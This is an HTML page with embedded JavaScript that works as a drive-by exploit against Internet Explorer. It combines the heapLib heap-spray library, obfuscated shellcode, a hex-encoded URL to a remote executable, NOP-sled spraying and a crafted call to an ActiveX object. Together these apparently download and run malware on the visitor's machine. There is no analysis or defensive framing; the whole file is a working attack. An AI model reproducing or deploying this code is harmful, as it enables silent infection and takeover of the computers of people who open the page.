<html>
<head>
<script>

function heapLib() {
}




heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    
    this.mem = new Array();

    
    this.flushOleaut32();
}




heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}




heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}




heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}




heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}




heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}




heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}




heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}




heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}




heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    
    CollectGarbage();
}




heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    

    this.freeOleaut32("oleaut32");
    
    

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}




heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    
    this.allocOleaut32(arg, tag);
}



heapLib.ie.prototype.free = function(tag) {

    
    this.freeOleaut32(tag);

    
    this.flushOleaut32();
}




heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}




heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}




heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}




heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}




heapLib.ie.prototype.vtable = function(sssccc, jmpecx, size) {

    var size = (size ? size : 1008);

    
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (sssccc.length*2 > size-138)
        throw("Maximum sssccc length is " + (size-138) + " bytes");

    

    var zero="0";
    var vtable = unescape("%"+"u"+"9"+"0"+"9"+zero+"%u7ceb") ;

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    vtable += unescape("%"+"u0028%"+"u0028") +    
              sssccc + heap.padding((size-138)/2 - sssccc.length);

    return vtable;
}


var heap_obj = new heapLib.ie(0x20000);

var tkscctv = "%u7468%u7074%u2f3a%u772f%u7777%u312e%u3231%u6d77%u632e%u6d6f%u732f%u6376%u652e%u6578%u0000";
var codecode = "KP9090KP9090KP54ebKP758bKP8b3cKP3574KP0378KP56f5KP768bKP0320KP33f5KP49c9KPad41KPdb33KP0f36KP14beKP3828KP74f2KPc108KP0dcbKPda03KPeb40KP3befKP75dfKP5ee7KP5e8bKP0324KP66ddKP0c8bKP8b4bKP1c5eKPdd03KP048bKP038bKPc3c5KP7275KP6d6cKP6e6fKP642eKP6c6cKP4300KP5c3aKP2e6eKP6373KP0072KPc033KP0364KP3040KP0c78KP408bKP8b0cKP1c70KP8badKP0840KP09ebKP408bKP8d34KP7c40KP408bKP953cKP8ebfKP0e4eKPe8ecKPff84KPffffKPec83KP8304KP242cKPff3cKP95d0KPbf50KP1a36KP702fKP6fe8KPffffKP8bffKP2454KP8dfcKPba52KPdb33KP5353KPeb52KP5324KPd0ffKPbf5dKPfe98KP0e8aKP53e8KPffffKP83ffKP04ecKP2c83KP6224KPd0ffKP7ebfKPe2d8KPe873KPff40KPffffKPff52KPe8d0KPffd7KPffff";

var code =(codecode.replace(/KP/g,"%u"))+ tkscctv;

code =unescape(code);
var ze="0";
var nops = unescape("%u"+ze+"c"+ze+"c%"+"u"+ze+"c0c");

while (nops.length < 0x80000) nops += nops;

var offset = nops.substring(0, 0x100);
var sssccc = offset + code + nops.substring(0, 0x800-code.length-offset.length);

while (sssccc.length < 0x40000) sssccc += sssccc;
var block = sssccc.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}
</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="VPMD"></object>
<script>
var obj = document.getElementById('VPMD').object;
var zf="0";
var src = unescape("%u"+zf+"c"+zf+"8%u"+zf+"c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(1000);
</script>
</body>
</html>